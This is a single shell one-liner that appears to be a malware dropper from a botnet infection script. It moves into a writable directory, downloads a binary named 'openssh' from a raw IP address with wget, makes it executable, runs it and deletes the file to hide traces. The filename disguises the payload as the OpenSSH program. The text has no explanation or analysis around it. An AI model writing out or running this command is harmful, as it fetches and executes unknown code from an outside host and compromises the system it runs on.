cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.77.148.223/openssh; chmod +x openssh; ./openssh; rm -rf openssh
